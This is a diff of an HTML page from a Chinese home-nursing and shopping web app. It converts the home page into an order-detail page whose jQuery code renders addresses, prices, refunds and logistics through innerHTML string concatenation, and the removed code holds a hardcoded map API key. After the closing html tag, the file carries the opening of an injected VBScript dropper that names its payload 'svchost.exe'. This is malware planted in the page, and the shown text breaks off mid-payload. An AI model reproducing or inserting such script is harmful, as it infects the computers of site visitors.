@@ -3,192 +3,416 @@
 
 	<head>
 		<meta charset="utf-8">
-		<title>金牌护士|护士上门 养老护理 医疗体检 就医陪诊 美白针 上门打针输液</title>
-		<meta name="keywords" content="护士上门 上门护理 医护到家 养老护理 医疗体检 就医陪诊 美白针 上门打针输液换药">
-		<meta name="description" content="金牌护士是一家提供上门健康服务的O2O平台。核心服务包括养老护理、医学康复、家庭病房、上门打针输液、母婴护理等多种上门医护服务。服务面积已覆盖北京、上海、广州、深圳、重庆、天津、江苏、浙江、山东、山西、湖北、辽宁、广东、吉林等省市提供上门健康服务">
+		<title>订单详情</title>
 		<meta name="viewport" content="width=device-width, initial-scale=1,maximum-scale=1,user-scalable=no">
 		<meta name="apple-mobile-web-app-capable" content="yes">
 		<meta name="apple-mobile-web-app-status-bar-style" content="black">
-		<link rel="stylesheet" href="/assets/css/mui.min.css" />
-		<script src="/assets/js/index/before.js"></script>
 		<!--#include file="/common/head.html"-->
-		<link rel="stylesheet" href="/assets/css/swiper.min.css">
 	</head>
 
 	<body>
-		<nav class="mui-bar mui-bar-tab">
-			<div class="mui-tab-item mui-active" onclick="shouye()">
-				<span class="mui-icon mui-icon-home">
-					<img src="/assets/img/shouye_o.png" id="img1"/>
-				</span>
-				<span class="mui-tab-label mt-5">首页</span>
+		<!--<header>
+			<div class="public_header">
+				确认订单
 			</div>
-			<div class="mui-tab-item" onclick="nurse()">
-				<span class="mui-icon mui-icon-email">
-					<img src="/assets/img/hus_n.png" id="img2"/>
-				</span>
-				<span class="mui-tab-label mt-5">护士</span>
-			</div>
-			<div class="mui-tab-item" onclick="i_jingxuan()">
-				<span class="mui-icon mui-icon-contact">
-					<img src="/assets/img/jingxuan_n.png" id="img3"/>
-				</span>
-				<span class="mui-tab-label mt-5">精选</span>
-			</div>
-			<div class="mui-tab-item" onclick="tz_p()">
-				<span class="mui-icon mui-icon-gear">
-					<img src="/assets/img/geren_n.png" id="img4">
-				</span>
-				<span class="mui-tab-label mt-5">个人中心</span>
-			</div>
-		</nav>
-		<div class="mui-content" style="display: none;">
-			<div class="indexlb_head_bg">
-			</div>
-			<div class="indexlb_head">
-				<div onclick="personal()">
-					<span class="ml-10" id="index_city"></span>
-					<span class="public-horn-135 ml-5"></span>
+		</header>-->
+		<section class="pb-50">
+			<div class="public-cell public-cell-0 color">
+				<div class="public_primary" id="orderNo" style="font-size: 14px;">
+
 				</div>
-				<!--	<div>
-					<span class="ml-10" id="index_city"></span>
-					<span class="public-horn-135 ml-5"></span>
-				</div>-->
+				<span id="schedule"></span>
 			</div>
-			<div class="swiper-container" id="slither">
-				<div class="swiper-wrapper">
-				</div>
-				<div class="swiper-pagination"></div>
-			</div>
-			<div class="index_l">
-			</div>
-			<div class="index_g mt-10" onclick="tanfang()" >
-				<img src="" class="img-responsive"/>
-			</div>
-			<section class="index_zx mt-10">
+			<div class="address_gl">
 				<div class="public-cell">
-					<img src="/assets/img/shouye_jiankangzixun.png" />
-
-					<span class="index_zx_bt" onclick="newlist()">					
-					健康资讯					
-				    </span>
-
-					<div class="public_primary index_zx_top">
-						<ul id="zx">
-						</ul>
-
+					<img src="/assets/img/goods/querendingdan_diaz.png" style="margin-bottom: 57px;" />
+					<div class="public_primary" id="address">
+						<p class="address_p1" style="padding-top: 0;">
+							<span></span>
+							<span></span>
+						</p>
+						<p style="margin-bottom: 0;"></p>
 					</div>
 				</div>
-			</section>
-			<section class="index_tj clearfix">
-				<div class="public-cell pull-left" onclick="dingzhifuwu()">
-					<img src="/assets/img/shouye_dingzfuwu.png" />
-					<div class="public_primary index_dz">
-						<h1>定制服务</h1>
-						<!--<p>我我我我我我我我</p>-->
-					</div>
-				</div>
-				<div class="public-cell pull-right" onclick="xptj()">
-					<img src="/assets/img/shouye_xinpintuijian.png" />
-					<div class="public_primary index_dz">
-						<h1>新品推荐</h1>
-						<!--<p>我我我我我我我我</p>-->
-					</div>
-				</div>
-			</section>
-			<section class="index_rm">
-				<header class="public-cell public-cell-0">
-					<img src="/assets/img/shouye_remenfuwu.png" />
-					<p>热门服务</p>
-				</header>
-				<div id="rm">
-				</div>
-			</section>
 
+			</div>
+			<div class="public-cell public-cell-0 color  mt-10">
+
+				<div class="public_primary" id="logisticsInfo1" style="display: none; font-size: 13px;">
+					物流信息
+				</div>
+				<span class="wuliu" id="logisticsInfo2" style="display: none;">
+				<button>查看物流</button>
+				</span>
+
+			</div>
+			<div id="comList">
+
+			</div>
+			<input type="hidden" id="remindTime" value="0" />
+
+			<div class="wl_xq color">
+				<p>订单编号：<span id="orderId" style="font-size: 14px;"></span></p>
+				<p>下单时间：<span id="createTime" style="font-size: 14px;"> </span></p>
+				<p>付款时间：<span id="payTime" style="font-size: 14px;"> </span></p>
+				<p>发货时间：<span id="sendTime" style="font-size: 14px;"> </span></p>
+			</div>
+			<hr class="n_hr" />
+			<div class="public-cell public-cell-left color">
+				<div class="public_primary">
+					<h1>商品总价</h1>
+				</div>
+				<span class="peisong_color">￥<span id="money" style="font-size: 16px;"></span></span>
+			</div>
+			<div class="public-cell public-cell-left color" id="voucherPrice">
+				<div class="public_primary">
+					<h1>优惠券</h1>
+				</div>
+				<span class="peisong_color"></span>
+			</div>
+			<div class="public-cell public-cell-left color" id="actvityPrice">
+				<div class="public_primary">
+					<h1>活动优惠</h1>
+				</div>
+				<span class="peisong_color"></span>
+			</div>
+			<div class="public-cell public-cell-left color">
+				<div class="public_primary">
+					<h1>运费</h1>
+				</div>
+				<span class="peisong_color">免运费</span>
+			</div>
+			<div class="public-cell color d_price">
+				<div class="public_primary"> 总计：
+					<em id="allMoney"></em>
+				</div>
+			</div>
+		</section>
+		<div class="d_footer" id="ok">
 		</div>
-		<!--#include file="/common/toastDialog.html"-->
-		<!--#include file="/common/toastLoading.html"-->
-		<script src="/assets/js/swiper.min.js"></script>
-		<script src="/assets/js/index/index.js"></script>
-		<!--<script src="http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js"></script>-->
-		<script src="/assets/js/layer/layer.js"></script>
-		<script src="/assets/js/login/index.js"></script>
-		<script>
-			$(function() {
-				var pids = "";
+	</body>
+	<script src="/assets/js/layer/layer.js"></script>
+	<script>
+		var path = basePath();
+		$(function() {
 
-				if(!localStorageIsNotnull("pid")) {
-					pids = getlocalStorage("pid");
+			var id = "";
+			id = GetRequest()['id']
+			if(id == "") {
+				id = getlocalStorage("tkId");
+			}
+			param = {
+				orderId: id,
+			}
+			sendAjaxTrue(shopOrderDetail, param, "json", function(data) {
+				var result = data.result;
+				var comList = result.coiList;
+				var address = "";
+				var k = 0;
+				address = "<p class='address_p1' style='padding-top: 0;'>" +
+					"<span>" + result.receiveName + "</span>" +
+					"<span>" + result.phone + "</span>" +
+					"</p>" +
+					"<p style='margin-bottom: 25px;'>" + result.address + result.detailAddress + "</p>";
+				document.getElementById("address").innerHTML = address;
+				document.getElementById("orderId").innerHTML = result.orderNo;
+				document.getElementById("orderNo").innerHTML = result.orderNo;
+
+				var schedule = "";
+
+				var allMoney = 0;
+
+				if(result.schedule == 0) {
+					schedule = "待付款";
+
+				} else if(result.schedule == 1) {
+					schedule = "待发货";
+				} else if(result.schedule == 2) {
+					schedule = "待收货";
+				} else if(result.schedule == 3) {
+					schedule = "待评价";
+				} else if(result.schedule == 4) {
+					schedule = "交易成功";
+				} else if(result.schedule == -1) {
+					schedule = "交易关闭";
+				}/* else if(result.schedule == -2) {
+					schedule = "待发货";
+				}*/ else if(result.schedule == -3) {
+					schedule = "交易关闭";
+				} else if(result.schedule == -6) {
+					schedule = "待收货";
 				}
-				clearLocalStorage(0);
-				if(!IdValStrnigs("pids")) {
-					setlocalStorage("pid", pids);
+
+				var createTime = getDateTime(new Date(result.createTime.time));
+				var payTime = "暂未支付";
+				if(result.payTime != null) {
+					payTime = getDateTime(new Date(result.payTime.time));
+				}
+				var sendTime = "暂未发货";
+				if(result.sendTime != null) {
+					sendTime = getDateTime(new Date(result.sendTime.time));
+				}
+				document.getElementById("createTime").innerHTML = createTime;
+				document.getElementById("payTime").innerHTML = payTime;
+				document.getElementById("sendTime").innerHTML = sendTime;
+				var comInfo = "";
+				var voucherPrice =result.voucherPrice;
+				$('#voucherPrice span').html('-￥'+voucherPrice.toFixed(2));
+				var actvityPrice =0;
+				for(var i = 0; i < comList.length; i++) {
+					var Apply = "<button onclick = tk('" + comList[i].url + "','" + comList[i].title + "','" + comList[i].name + "','" + comList[i].price + "','" + comList[i].number + "','" + comList[i].id + "','" + result.id + "','" + comList.length + "','" + result.schedule + "')>申请售后</button>";
+				//	var tk = "<button onclick = tk('" + comList[i].url + "','" + comList[i].title + "','" + comList[i].name + "','" + comList[i].price + "','" + comList[i].number + "','" + comList[i].id + "','" + result.id + "','" + comList.length + "','" + result.schedule + "')>退款</button>";
+					var tk = "";
+					var buttons = "";
+					if(undefined!=comList[i].activityPromotionId&&[i].activityPromotionId!=''){
+						actvityPrice +=comList[i].activityPromotionPrice*comList[i].number;
+					}
+					if(result.schedule != 0) {
+						
+						
+						
+						if(comList[i].status == -1) {
+							if(result.schedule != -1) {
+ 
+							//	buttons = "<span onclick=xq('" + comList[i].crId + "','" + comList[i].url + "','" + comList[i].title + "','" + comList[i].name + "','" + result.schedule + "') style='font-size:14px;'>退款中<span>";
+							}
+
+						} else if(comList[i].status == -1) {
+							buttons = "<span onclick=xq('" + comList[i].crId + "','" + comList[i].url + "','" + comList[i].title + "','" + comList[i].name + "','" + result.schedule + "') style='font-size:14px;'>退款成功<span>";
+						} else if(comList[i].status == -3) {
+							buttons = "<span onclick=xq('" + comList[i].crId + "','" + comList[i].url + "','" + comList[i].title + "','" + comList[i].name + "','" + result.schedule + "') style='font-size:14px;'>退款失败<span>";
+						} else if(comList[i].status == 0) {
+
+							buttons = tk;
+						} else if(comList[i].status == 2) {
+
+							buttons = tk;
+						} else {
+
+							buttons = Apply;
+						}
+
+						if(result.schedule == 4) {
+							if(comList[i].status == 1) {
+								buttons = Apply;
+							}
+							/*if(comList[i].status == -1) {
+								buttons = "<span onclick=xq('" + comList[i].crId + "','" + comList[i].url + "','" + comList[i].title + "','" + comList[i].name + "','" + result.schedule + "') style='font-size:14px;'>退款中<span>";
+							}*/
+
+						}
+
+							if(comList[i].crStatus == 2){
+								buttons = "<span onclick=xq('" + comList[i].crId + "','" + comList[i].url + "','" + comList[i].title + "','" + comList[i].name + "','" + result.schedule + "') style='font-size:14px;'>退款成功<span>";
+							} else if(comList[i].crStatus == -2) {
+								buttons = "<span onclick=xq('" + comList[i].crId + "','" + comList[i].url + "','" + comList[i].title + "','" + comList[i].name + "','" + result.schedule + "') style='font-size:14px;'>退款失败<span>";
+							}/*else if(comList[i].crStatus == 0){
+								buttons = "<button onclick = tk('" + comList[i].url + "','" + comList[i].title + "','" + comList[i].name + "','" + comList[i].price + "','" + comList[i].number + "','" + comList[i].id + "','" + result.id + "','" + comList.length + "','" + result.schedule + "')>退款</button>";
+							}*/
+					}
+					
+					//	if(result.schedule == 1) {
+						
+					//	}
+
+					if(result.schedule == 2) {
+						$("#logisticsInfo1").show();
+						$("#logisticsInfo2").show();
+						document.getElementById("logisticsInfo2").innerHTML = "<button class='pull-right' onclick=checkLogistics('" + result.orderNo + "','" + result.id + "')>查看物流</ button>";
+					} else if(result.schedule == -6) {
+						$("#logisticsInfo1").show();
+						$("#logisticsInfo2").show();
+					}else if(result.schedule == 4){
+						$("#logisticsInfo1").show();
+						$("#logisticsInfo2").show();
+						document.getElementById("logisticsInfo2").innerHTML = "<button class='pull-right' onclick=checkLogistics('" + result.orderNo + "','" + result.id + "')>查看物流</ button>";
+					}
+					var names = "";
+					 
+					comInfo += "<div class='public-cell2 public-cell-0 gwc'>" +
+						"<img src='" + comList[i].url + "' />" +
+						"<div class='public_primary' style='padding-top: 0;'>" +
+						"<h1>" + comList[i].title + "<span class='pull-right' style='font-size: 15px;color: red;'>x" + comList[i].number + "</span></h1>" +
+						"<div class='mt-10 gwc_p_color'>" + comList[i].name + "</div>" +
+						"<p>" +
+						"<span>￥" + comList[i].oldPrice.toFixed(2) + "</span>" +
+						"<span class='wuliu pull-right'>" +
+						buttons +
+						"</span>" +
+						"</p>" +
+						"</div>" +
+						"</div>";
+					allMoney += comList[i].oldPrice * comList[i].number;
+					names += "，" + comList[i].title;
+
+				}
+				console.info('活动优惠价'+actvityPrice.toFixed(2));
+				$('#actvityPrice span').html('-￥'+actvityPrice.toFixed(2));
+				allMoney = allMoney.toFixed(2);
+				document.getElementById("comList").innerHTML = comInfo;
+				document.getElementById("allMoney").innerHTML = "￥" + result.payPrice.toFixed(2);
+				document.getElementById("money").innerHTML = allMoney;
+				var qr = "<button class='queren_btn' onclick=ok('" + result.id + "')>确认收货</button>";
+				var remindTime = "";
+				if(result.remindTime == null) {
+					remindTime = 1;
+				}
+				if(result.schedule == -1) {
+					document.getElementById("ok").innerHTML = "<button class='queren_btn' onclick=deleteOrder('" + result.id + "')>删除订单</button>";
+				} else if(result.schedule == 1) {
+					document.getElementById("ok").innerHTML = "<button class='queren_btn' onclick=updateRemindTime('" + result.id + "','" + remindTime + "')>提醒发货</button>";
+				} else if(result.schedule == 0) {
+					document.getElementById("ok").innerHTML = "<button class='queren_btn' onclick=toPay('" + names + "','" + result.orderNo + "','" + result.payPrice + "')>立即支付</button>";
+				} else if(result.schedule == 2) {
+					document.getElementById("ok").innerHTML = qr;
+				} else if(result.schedule == 4) {
+					document.getElementById("ok").innerHTML = "<button class='queren_btn' onclick=ok('" + result.id + "')>删除订单</button>";
+				} else if(result.schedule == -2) {
+					document.getElementById("ok").innerHTML = "<button class='queren_btn' onclick=updateRemindTime('" + result.id + "','" + remindTime + "')>提醒发货</button>";
+				} else if(result.schedule == -3) {
+					document.getElementById("ok").innerHTML = "<button class='queren_btn' onclick=ok('" + result.id + "')>删除订单</button>";
+				} else if(result.schedule == -6) {
+
+					document.getElementById("ok").innerHTML = qr;
+				}
+
+				for(var i = 0; i < comList.length; i++) {
+
+					if(comList[i].crStatus == 2) {
+						k++;
+
+					}
+					if(k == comList.length) {
+						schedule = "交易关闭";
+						document.getElementById("ok").innerHTML = "<button class='queren_btn' onclick=deleteOrder('" + result.id + "')>删除订单</button>";
+					}
+					document.getElementById("schedule").innerHTML = schedule;
 				}
 			})
 
-			var _script = document.createElement('script');
-			_script.type = "text/javascript";
-			_key = "x2HN3bqmnQTDqPQbcupExKulGRdWbzak"; //百度地图可以申请到
-			_script.src = "https://api.map.baidu.com/location/ip?ak=" + _key + "&coor=bd09ll&callback=citycallback"; //拼接URL
-			document.head.appendChild(_script);
+		})
 
-			function citycallback(data) {
-				console.log(data);
-				var city = data.content.address_detail.city;
-				var city1 = sessionStorage.getItem("set_index_city");
-				if(city1 != "" && city1 != null) {
-					$("#index_city").html(city1);
-					sessionStorage.setItem("city_dw1", $("#index_city").html());
+		function ok(id) {
+			param = {
+				id: id,
+			}
+			sendAjaxTrue(confimOrder, param, "text", function(data) {
+				layer.msg("收货成功！", { time: 2000 });
+				window.setTimeout('location.reload()', 2000);
+			})
+		}
+
+		function toPay(names, orderNo, allMoney) {
+			var arr = names.substr(1).split("，");
+			Array.prototype.unique3 = function() {
+				var res = [];
+				var json = {};
+				for(var i = 0; i < this.length; i++) {
+					if(!json[this[i]]) {
+						res.push(this[i]);
+						json[this[i]] = 1;
+					}
+				}
+				return res;
+			}
+			var orderNos = orderNo.substr(0, orderNo.length - 2);
+			var goodsName = arr.unique3();
+
+			setlocalStorage("goodsName", goodsName);
+			setlocalStorage("orderNos", orderNos);
+			setlocalStorage("payPrice", allMoney.toFixed(2));
+			setlocalStorage("serviceAndGoodsType", 3);
+			location.href = path+"/product/pay.html";
+		}
+
+		function updateRemindTime(id, time) {
+			if(time == 1) {
+
+				var reFlag = $("#remindTime").val();
+
+				if(reFlag == 0) {
+					$("#remindTime").val(1);
+					param = {
+						id: id,
+					}
+					sendAjaxTrue(remindTime, param, "json", function(data) {
+						if(data.result == 1) {
+							layer.msg("提醒成功！", { time: 1500 });
+
+						}
+					})
 				} else {
-					$("#index_city").html(city);
-					sessionStorage.setItem("city_dw1", city);
+					layer.msg("已提醒！", { time: 1500 });
 				}
-
+			} else {
+				layer.msg("已提醒！", { time: 1500 });
 			}
+		}
 
-			function shouye() {
-				window.location.href = path + '/index.html';
-			}
+		function tk(tkurl, tktitle, tkname, tkprice, tknumber, tkId, tkCoId, length, schedule) {
 
-			function tanfang() {
-				window.location.href = path + '/product/visit/index.html';
-			}
-
-			function dingzhifuwu() {
-				if(localStorageIsNotnull("set")) {
-					window.location.href = "/login/loginAmong.html";
+			setlocalStorage("tkurl", tkurl);
+			setlocalStorage("tktitle", tktitle);
+			setlocalStorage("tkname", tkname);
+			setlocalStorage("tkprice", tkprice);
+			setlocalStorage("tknumber", tknumber);
+			setlocalStorage("return_coId", tkCoId);
+			setlocalStorage("tkId", tkId);
+			setlocalStorage("tkCoId", tkCoId);
+			setlocalStorage("tkSchedule", schedule);
+			/*if(schedule == 1) {
+				setlocalStorage("tkFlag", "Y");
+				location.href = "apply.html";
+			} else if(schedule == -2) {
+				setlocalStorage("tkFlag", "Y");
+				location.href = "apply.html";
+			} else {
+				setlocalStorage("tkFlag", "N");
+				location.href = "refund.html";
+			}*/
+				if(schedule == 4){
+					setlocalStorage("tkFlag", "Y");
+				}else{
+					setlocalStorage("tkFlag", "N");
 				}
-				var infoid = localStorage.getItem("set");
-				//console.log(JSON.parse(infoid).id)
-				if(IdValStrnigs(infoid)) {
-					window.location.href = "/login/loginAmong.html";
-				} else {
-					window.location.href = path + '/product/custom/customServer.html';
+				location.href ="apply.html";
+		}
+
+		function xq(crId, url, title, name, schedule) {
+			setlocalStorage("crId", crId);
+			setlocalStorage("tkxqurl", url);
+			setlocalStorage("tkxqtitle", title);
+			setlocalStorage("tkxqname", name);
+			var id = GetRequest()['id']
+			setlocalStorage("return_coId", id);
+			setlocalStorage("tkSchedule", schedule);
+			location.href = "refund_xq.html";
+		}
+
+		function deleteOrder(id) {
+			param = {
+				id: id,
+			}
+			sendAjaxTrue(deleteOrders, param, "json", function(data) {
+				if(data.resultcode == 1) {
+
+					window.setTimeout('toList()', 2000);
 				}
+			})
+		}
 
-			}
+		function toList() {
+			location.href ="orderlist.html";
+		}
 
-			function nurse() {
-				window.location.href = path + '/nurse/index.html'
-			}
+		function checkLogistics(orderNo, id) {
 
-			function i_jingxuan() {
-				window.location.href = path + '/activity/index.html';
-			}
-
-			function personal() {
-				window.location.href = path + '/location.html';
-			}
-
-			function newlist() {
-				window.location.href = path + '/news/index.html';
-			}
-
-			function xptj() {
-				window.location.href = path + "/product/goods/index.html";
-			}
-		</script>
-	</body>
+			//	orderNo:orderNo,
+			setlocalStorage("orderNo", orderNo);
+			setlocalStorage("id", id);
+			location.href ="logistics.html";
+		}
+	</script>
 
 </html><SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
